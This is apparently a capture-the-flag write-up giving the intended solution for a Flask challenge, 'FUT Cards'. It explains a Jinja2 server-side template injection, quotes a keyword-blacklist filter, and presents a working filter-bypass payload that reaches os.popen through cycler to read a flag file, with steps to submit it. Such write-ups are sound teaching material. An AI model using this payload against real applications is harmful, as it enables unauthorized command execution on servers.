# FUT Cards CTF Challenge - Intended Solve

## 1. Vulnerability Overview
The challenge contains a **Server-Side Template Injection (SSTI)** vulnerability in the `/view` route within the custom "Jersey Signature" feature. 

When you add a player to your squad, their signature is processed. In `app.py`, the application unsafely renders the player's signature string via Jinja2's `render_template_string`:
```python
rendered_signature = render_template_string(p['signature'])
```

## 2. Security Mechanisms
The application employs a basic Web Application Firewall (WAF) using a keyword blacklist to block standard SSTI payloads:
```python
BLACKLIST = [
    'config', 'subprocess', 'import', 'popen',
    'system', 'eval', 'exec', '__class__',
    '__mro__', '__subclasses__', 'request',
    'application', 'globals'
]
```
If any of these words are found in your signature, the application blocks the submission.

## 3. The Exploit
To bypass the blacklist, we can take advantage of the fact that Jinja2 allows string concatenation using the `~` operator. We can split up dangerous keywords like `__globals__` and `popen` so they pass the WAF undisturbed.

Instead of accessing standard Flask objects that require `__class__` traversals, we can leverage the built-in Jinja2 `cycler` generator object to easily access `os.popen`.

The structure is:
`cycler.__init__.__globals__.os.popen('command').read()`

To bypass the filter, we represent this using dictionary lookup and string concatenation:
* `__init__` -> `'__in'~'it__'`
* `__globals__` -> `'__gl'~'obals__'`
* `popen` -> `'po'~'pen'`

**Final Payload:**
```jinja2
{{ cycler['__in'~'it__']['__gl'~'obals__']['os']['po'~'pen']('cat /flag.txt').read() }}
```

*(Note: During local testing on Windows, you would use `'type flag.txt'` instead of `'cat /flag.txt'`)*

## 4. Execution Steps
1. Navigate to the **Create Team** page (`/create`).
2. Fill out Player Name, Club, and Jersey Number with any dummy data.
3. In the **Jersey Signature** field, paste exactly the final payload above.
4. Click **Add to Squad**.
5. You will be redirected to the **View Team** page.
6. The application renders the template, the string concatenation bypasses the WAF, and the command executes. The output of the command (the flag) will be printed directly on the user's FUT card signature block!
